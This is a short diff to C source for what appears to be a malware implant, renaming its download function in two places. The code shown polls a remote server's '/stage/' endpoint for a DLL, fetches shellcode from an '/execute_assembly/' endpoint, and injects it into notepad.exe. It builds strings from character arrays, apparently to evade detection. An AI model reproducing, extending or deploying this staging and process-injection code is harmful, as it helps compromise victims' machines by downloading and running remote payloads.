@@ -279,7 +279,7 @@ void myMain()
     WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
     while (pEsgStdDll->Buffer == NULL)
     {
-        pEsgStdDll->Buffer = winHTTPClient(api, &pEsgStdDll->Size, wcStageEndpoint, wServer, port);
+        pEsgStdDll->Buffer = httpGetExecutable(api, &pEsgStdDll->Size, wcStageEndpoint, wServer, port);
         ((SLEEP)api->Sleep)(5000);
         if (pEsgStdDll->Buffer != NULL)
         { break; }
@@ -415,7 +415,7 @@ void myMain()
             CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
             DWORD dwShellcodeSize;
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
-            LPVOID shellcode = winHTTPClient(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
+            LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
             CHAR hi[] = {'S', 'i', 'z', 'e', ':', ' ', '%', 'd', 0};
             ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
         }
